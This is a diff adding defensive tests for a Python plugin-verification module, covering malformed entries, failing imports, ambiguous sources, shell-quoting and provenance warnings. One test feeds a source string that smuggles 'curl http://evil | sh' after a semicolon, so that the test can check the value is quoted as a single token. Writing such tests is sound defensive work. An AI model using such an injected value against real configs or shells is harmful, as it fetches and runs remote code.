@@ -518,3 +518,79 @@ def test_prepare_plugins_verifies(tmp_path, cache_dir, cleanup_syspath):
     finally:
         manager.plugins.clear()
         manager.plugins.update(registered_before)
+
+
+# --- defensive edge cases ---------------------------------------------------
+
+
+def test_non_mapping_entry_raises_a_clear_error(default_cache):
+    # verify runs before pydantic, so a stray scalar must not crash with a TypeError.
+    with pytest.raises(ValueError, match="Invalid `plugins` entry"):
+        verify_plugins({"plugins": [123]})
+
+
+def test_plugin_whose_import_raises_is_reported(tmp_path, cache_dir, cleanup_syspath):
+    cls_path = _install_module(
+        tmp_path / "src",
+        "boom_plugin",
+        cache_dir=cache_dir,
+        source="https://github.com/org/repo.git",
+        body="raise RuntimeError('boom at import')\n",
+    )
+    cfg = {"plugins": [{"cls": cls_path, "source": "https://github.com/org/repo.git"}]}
+
+    with pytest.raises(
+        PluginNotInstalledError, match="could not be imported: RuntimeError"
+    ):
+        verify_plugins(cfg)
+
+
+def test_ambiguous_bare_source_asks_for_cls(tmp_path, cache_dir):
+    for sub in ("a", "b"):
+        record_install(
+            source="https://github.com/org/mono.git",
+            ref=None,
+            resolved_sha=sub * 40,
+            subdir=sub,
+            mode="syspath",
+            syspath_entry=str(tmp_path / sub),
+            cls=[f"{sub}_pkg.{sub.upper()}Plugin"],
+            cache_dir=cache_dir,
+        )
+    cfg = {"plugins": [{"source": "https://github.com/org/mono.git"}]}
+
+    with pytest.raises(PluginNotInstalledError, match="more than one installed plugin"):
+        verify_plugins(cfg)
+
+
+def test_install_command_is_shell_quoted(default_cache):
+    # A hostile config must not render a copy-pasteable `source; curl | sh`.
+    spec = PluginSpec(cls="a.B", source="https://x/r.git; curl http://evil | sh #")
+    cfg = {"plugins": [{"cls": "a.B", "source": spec.source}]}
+    with pytest.raises(PluginNotInstalledError) as excinfo:
+        verify_plugins(cfg)
+    # the whole source is a single quoted token, so the `;` cannot start a command
+    assert "'https://x/r.git; curl http://evil | sh #'" in str(excinfo.value)
+
+
+def test_provenance_mismatch_warns_but_loads(
+    tmp_path, cache_dir, cleanup_syspath, caplog
+):
+    cls_path = _install_module(
+        tmp_path / "src",
+        "prov_plugin",
+        cache_dir=cache_dir,
+        source="https://github.com/good/repo.git",
+    )
+    cfg = {
+        "plugins": [
+            {"cls": cls_path, "source": "https://github.com/EVIL/typosquat.git"}
+        ]
+    }
+    import logging
+
+    with caplog.at_level(logging.WARNING):
+        verify_plugins(cfg)
+
+    assert cfg["plugins"] == [cls_path]  # importable, so it still loads
+    assert any("was installed from" in r.message for r in caplog.records)
